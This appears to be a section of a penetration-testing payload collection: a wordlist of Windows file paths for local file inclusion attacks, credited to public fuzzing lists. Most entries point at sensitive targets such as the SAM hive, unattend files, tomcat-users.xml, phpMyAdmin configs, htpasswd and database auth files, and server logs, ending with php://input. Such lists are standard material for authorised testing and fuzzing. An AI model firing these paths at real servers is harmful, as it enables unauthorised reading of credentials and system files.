## Windows

Credits and Payloads from:
- https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows
- https://github.com/infosec-au/fuzzdb/blob/master/attack-payloads/lfi/common-windows-files.txt
- https://raw.githubusercontent.com/tennc/fuzzdb/master/dict/BURP-PayLoad/LFI/LFI-WinblowsFileCheck.txt
- https://ed4m4s.blog/tools/local-file-inclusion

```
\apache2\log\access.log
\apache2\log\access_log
\apache2\log\error.log
\apache2\log\error_log
\apache2\logs\access.log
\apache2\logs\access_log
\apache2\logs\error.log
\apache2\logs\error_log
\apache\log\access.log
\apache\log\access_log
\apache\log\error.log
\apache\log\error_log
\apache\logs\access.log
\apache\logs\access_log
\apache\logs\error.log
\apache\logs\error_log
\apache\php\php.ini
\AppServ\MySQL\data\mysql\user.MYD
\boot.ini
\home2\bin\stable\apache\php.ini
\home\bin\stable\apache\php.ini
\log\access.log
\log\access_log
\log\error.log
\log\error_log
\log\httpd\access_log
\log\httpd\error_log
\logs\access.log
\logs\access_log
\logs\error.log
\logs\error_log
\logs\httpd\access_log
\logs\httpd\error_log
\mysql\bin\my.ini
\opt\xampp\logs\access.log
\opt\xampp\logs\access_log
\opt\xampp\logs\error.log
\opt\xampp\logs\error_log
\php4\php.ini
\php5\php.ini
\php\php.ini
\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
\Program Files (x86)\Apache Group\Apache\logs\access.log
\Program Files (x86)\Apache Group\Apache\logs\error.log
\Program Files (x86)\FileZilla Server\FileZilla Server.xml
\Program Files (x86)\xampp\apache\conf\httpd.conf
\Program Files\Apache Group\Apache2\conf\httpd.conf
\Program Files\Apache Group\Apache2\conf\httpd.conf
\Program Files\Apache Group\Apache\conf\httpd.conf
\Program Files\Apache Group\Apache\conf\httpd.conf
\Program Files\Apache Group\Apache\logs\access.log
\Program Files\Apache Group\Apache\logs\access.log
\Program Files\Apache Group\Apache\logs\error.log
\Program Files\Apache Group\Apache\logs\error.log
\Program Files\FileZilla Server\FileZilla Server.xml
\Program Files\xampp\apache\conf\httpd.conf
\Program Files\xampp\apache\conf\httpd.conf
\WINDOWS\php.ini
\WINDOWS\Repair\SAM
\WINDOWS\system32\drivers\etc\hosts
\WINDOWS\win.ini
\WINNT\php.ini
\WINNT\win.ini
\xampp\apache\bin\php.ini
\xampp\apache\conf\httpd.conf
\xampp\apache\logs\access.log
\xampp\apache\logs\error.log
\xampp\FileZillaFTP\FileZilla Server.xml
\xampp\FileZillaFTP\Logs
\xampp\FileZillaFTP\Logs\access.log
\xampp\FileZillaFTP\Logs\error.log
\xampp\MercuryMail\LOGS\access.log
\xampp\MercuryMail\LOGS\error.log
\xampp\MercuryMail\mercury.ini
\xampp\mysql\data\mysql.err
\xampp\php\php.ini
\xampp\phpMyAdmin\config.inc
\xampp\phpmyadmin\config.inc
\xampp\phpmyadmin\config.inc.php
\xampp\phpMyAdmin\config.inc.php
\xampp\phpMyAdmin\config.inc.php
\xampp\phpMyAdmin\phpinfo.php
\xampp\phpmyadmin\phpinfo.php
\xampp\sendmail\sendmail.ini
\xampp\sendmail\sendmail.log
\xampp\tomcat\conf\tomcat-users.xml
\xampp\tomcat\conf\web.xml
\xampp\webalizer\webalizer.conf
\xampp\webdav\webdav.txt
c:/apache/php/php.ini
C:/Autounattend.xml
c:/boot.ini
c:/etc/postgresql/pg_hba.conf
c:/etc/postgresql/postgresql.conf
c:/home/postgres/data/pg_hba.conf
c:/home/postgres/data/pg_ident.conf
c:/home/postgres/data/PG_VERSION
c:/home/postgres/data/postgresql.conf
C:/inetpub/logs/logfiles
C:/inetpub/wwwroot
C:/inetpub/wwwroot/web.config
c:/mysql/bin/my.ini
c:/MySQL/data/mysql-bin.index
c:/MySQL/data/mysql-bin.log
c:/MySQL/data/mysql.err
c:/MySQL/data/mysql.log
c:/MySQL/data/{IPDELHOST}.err
c:/MySQL/my.cnf
c:/MySQL/my.ini
c:/NetServer/bin/stable/apache/php.ini
c:/php/php.ini
c:/PHP/php.ini
c:/php4/php.ini
c:/php5/php.ini
c:/PostgreSQL/log/pgadmin.log
c:/Program Files/Apache Group/Apache/apache.conf
c:/Program Files/Apache Group/Apache/apache2.conf
c:/Program Files/Apache Group/Apache/conf/apache.conf
c:/Program Files/Apache Group/Apache/conf/apache2.conf
c:/Program Files/Apache Group/Apache/conf/httpd.conf
c:/Program Files/Apache Group/Apache/logs/access.log
c:/Program Files/Apache Group/Apache/logs/error.log
c:/Program Files/Apache Group/Apache2/conf/apache.conf
c:/Program Files/Apache Group/Apache2/conf/apache2.conf
c:/Program Files/Apache Group/Apache2/conf/httpd.conf
c:/Program Files/Apache Software Foundation/Apache2.2/conf/httpd.conf
c:/Program Files/Apache Software Foundation/Apache2.2/logs/access.log
c:/Program Files/Apache Software Foundation/Apache2.2/logs/error.log
c:/Program Files/MySQL/data/mysql-bin.index
c:/Program Files/MySQL/data/mysql-bin.log
c:/Program Files/MySQL/data/mysql.err
c:/Program Files/MySQL/data/mysql.log
c:/Program Files/MySQL/data/{IPDELHOST}.err
c:/Program Files/MySQL/my.cnf
c:/Program Files/MySQL/my.ini
c:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.index
c:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
c:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
c:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
c:/Program Files/MySQL/MySQL Server 5.0/data/{IPDELHOST}.err
c:/Program Files/MySQL/MySQL Server 5.0/my.cnf
c:/Program Files/MySQL/MySQL Server 5.0/my.ini
c:/Program Files/PostgreSQL/8.3/data/pg_hba.conf
c:/Program Files/PostgreSQL/8.3/data/pg_ident.conf
c:/Program Files/PostgreSQL/8.3/data/postgresql.conf
c:/Program Files/PostgreSQL/8.4/data/pg_hba.conf
c:/Program Files/PostgreSQL/8.4/data/pg_ident.conf
c:/Program Files/PostgreSQL/8.4/data/postgresql.conf
c:/Program Files/PostgreSQL/9.0/data/pg_hba.conf
c:/Program Files/PostgreSQL/9.0/data/pg_ident.conf
c:/Program Files/PostgreSQL/9.0/data/postgresql.conf
c:/Program Files/PostgreSQL/9.1/data/pg_hba.conf
c:/Program Files/PostgreSQL/9.1/data/pg_ident.conf
c:/Program Files/PostgreSQL/9.1/data/postgresql.conf
c:/Program Files/Vidalia Bundle/Polipo/polipo.conf
c:/Program Files/xampp/apache/conf/apache.conf
c:/Program Files/xampp/apache/conf/apache2.conf
c:/Program Files/xampp/apache/conf/httpd.conf
C:/Unattend.xml
c:/usr/internet/pgsql/data/pg_hba.conf
c:/usr/local/pgsql/bin/pg_passwd
c:/usr/local/pgsql/data/passwd
c:/usr/local/pgsql/data/pg_hba.conf
c:/usr/local/pgsql/data/postgresql.conf
c:/var/lib/pgsql/data/postgresql.conf
c:/var/log/lighttpd/{DOMAIN}/access.log
c:/var/nm2/postgresql.conf
c:/var/postgresql/db/postgresql.conf
c:/wamp/bin/apache/apache2.2.21/conf/httpd.conf
c:/wamp/bin/apache/apache2.2.21/logs/access.log
c:/wamp/bin/apache/apache2.2.21/logs/error.log
c:/wamp/bin/apache/apache2.2.21/wampserver.conf
c:/wamp/bin/apache/apache2.2.22/conf/httpd.conf
c:/wamp/bin/apache/apache2.2.22/conf/wampserver.conf
c:/wamp/bin/apache/apache2.2.22/logs/access.log
c:/wamp/bin/apache/apache2.2.22/logs/error.log
c:/wamp/bin/apache/apache2.2.22/wampserver.conf
c:/wamp/bin/mysql/mysql5.5.16/data/mysql-bin.index
c:/wamp/bin/mysql/mysql5.5.16/my.ini
c:/wamp/bin/mysql/mysql5.5.16/wampserver.conf
c:/wamp/bin/mysql/mysql5.5.24/data/mysql-bin.index
c:/wamp/bin/mysql/mysql5.5.24/my.ini
c:/wamp/bin/mysql/mysql5.5.24/wampserver.conf
c:/wamp/bin/php/php5.3.8/php.ini
c:/wamp/bin/php/php5.4.3/php.ini
c:/wamp/logs/access.log
c:/wamp/logs/apache_error.log
c:/wamp/logs/genquery.log
c:/wamp/logs/mysql.log
c:/wamp/logs/slowquery.log
c:/WINDOWS/comsetup.log
c:/WINDOWS/Debug/NetSetup.LOG
c:/WINDOWS/ODBC.INI
C:/Windows/Panther/Unattend.txt
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
c:/WINDOWS/php.ini
c:/WINDOWS/repair/setup.log
c:/WINDOWS/setupact.log
c:/WINDOWS/setupapi.log
c:/WINDOWS/setuperr.log
c:/WINDOWS/system32/drivers/etc/hosts
C:/Windows/System32/drivers/etc/hosts
c:/WINDOWS/system32/drivers/etc/lmhosts.sam
c:/WINDOWS/system32/drivers/etc/networks
c:/WINDOWS/system32/drivers/etc/protocol
c:/WINDOWS/system32/drivers/etc/services
c:/WINDOWS/system32/logfiles/Firewall/pfirewall.log
c:/WINDOWS/system32/logfiles/Firewall/pfirewall.log.old
c:/WINDOWS/system32/logfiles/MSFTPSVC
c:/WINDOWS/system32/logfiles/MSFTPSVC1
c:/WINDOWS/system32/logfiles/MSFTPSVC2
c:/WINDOWS/system32/logfiles/SMTPSVC
c:/WINDOWS/system32/logfiles/SMTPSVC1
c:/WINDOWS/system32/logfiles/SMTPSVC2
c:/WINDOWS/system32/logfiles/SMTPSVC3
c:/WINDOWS/system32/logfiles/SMTPSVC4
c:/WINDOWS/system32/logfiles/SMTPSVC5
c:/WINDOWS/system32/logfiles/W3SVC/inetsvn1.log
c:/WINDOWS/system32/logfiles/W3SVC1/inetsvn1.log
c:/WINDOWS/system32/logfiles/W3SVC2/inetsvn1.log
c:/WINDOWS/system32/logfiles/W3SVC3/inetsvn1.log
c:/WINDOWS/system32/Macromed/Flash/FlashInstall.log
c:/WINDOWS/system32/Macromed/Flash/install.log
C:/Windows/system32/sysprep
c:/WINDOWS/updspapi.log
c:/WINDOWS/WindowsUpdate.log
c:/WINDOWS/wmsetup.log
c:/WINNT/php.ini
c:/WINNT/system32/logfiles/Firewall/pfirewall.log
c:/WINNT/system32/logfiles/Firewall/pfirewall.log.old
c:/WINNT/system32/logfiles/MSFTPSVC
c:/WINNT/system32/logfiles/MSFTPSVC1
c:/WINNT/system32/logfiles/MSFTPSVC2
c:/WINNT/system32/logfiles/SMTPSVC
c:/WINNT/system32/logfiles/SMTPSVC1
c:/WINNT/system32/logfiles/SMTPSVC2
c:/WINNT/system32/logfiles/SMTPSVC3
c:/WINNT/system32/logfiles/SMTPSVC4
c:/WINNT/system32/logfiles/SMTPSVC5
c:/WINNT/system32/logfiles/W3SVC/inetsvn1.log
c:/WINNT/system32/logfiles/W3SVC1/inetsvn1.log
c:/WINNT/system32/logfiles/W3SVC2/inetsvn1.log
c:/WINNT/system32/logfiles/W3SVC3/inetsvn1.log
c:/xampp/apache/bin/php.ini
C:/xampp/apache/bin/php.ini
c:/xampp/apache/conf/httpd.conf
C:/xampp/apache/conf/httpd.conf
C:/xampp/apache/conf/httpd.conf
c:/xampp/apache/logs/access.log
C:/xampp/apache/logs/access.log
c:/xampp/apache/logs/error.log
C:/xampp/apache/logs/error.log
c:/xampp/FileZillaFTP/FileZilla Server.xml
c:/xampp/htdocs/aca.txt
c:/xampp/htdocs/admin.php
c:/xampp/htdocs/leer.txt
c:/xampp/MercuryMail/mercury.ini
c:/xampp/mysql/data/mysql-bin.index
c:/xampp/mysql/data/mysql.err
c:/xampp/mysql/data/{IPDELHOST}.err
c:/xampp/php/php.ini
c:/xampp/phpMyAdmin/config.inc.php
C:/xampp/security/webdav.htpasswd
c:/xampp/sendmail/sendmail.ini
c:/xampp/sendmail/sendmail.log
C:/xampp/tomcat/conf/tomcat-users.xml
C:/xampp/tomcat/conf/web.xml
c:/xampp/webalizer/webalizer.conf
C:/xampp/webalizer/webalizer.conf
C:/xampp/webalizer/webdav.txt
C:\boot.ini
C:\WINDOWS\php.ini
C:\WINDOWS\win.ini
C:\WINNT\php.ini
php://input
```
